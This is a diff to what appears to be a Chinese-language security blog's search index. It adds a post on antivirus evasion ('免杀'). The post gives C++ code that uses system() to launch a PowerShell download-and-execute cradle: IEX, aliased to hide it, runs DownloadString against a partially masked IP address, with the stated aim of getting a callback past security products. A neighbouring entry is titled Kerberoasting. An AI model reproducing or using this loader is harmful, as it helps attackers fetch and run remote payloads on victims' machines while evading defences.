@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>c+powershell免杀</title>
+    <link href="/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/"/>
+    <url>/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/</url>
+    
+    <content type="html"><![CDATA[<p> powershell 的上线方式 现在很多都拦了  可以尝试将powershell语句 写入代码中  用可执行文件来调用powershell 执行命令</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;powershell.exe set-alias -name hhh -value IEX;hhh(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.xxx.xx:80/a&#x27;) &quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后编译</p><p><img src="/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/image-20220313005618323.png" alt="image-20220313005618323"></p><p><img src="/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/image-20220313010644322.png" alt="image-20220313010644322"></p><p><img src="/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/image-20220313010813690.png" alt="image-20220313010813690"></p><p><img src="/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/image-20220313010920748.png" alt="image-20220313010920748"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>免杀</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>免杀</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Kerberoasting</title>
     <link href="/2022/03/04/Kerberoasting/"/>
     <url>/2022/03/04/Kerberoasting/</url>
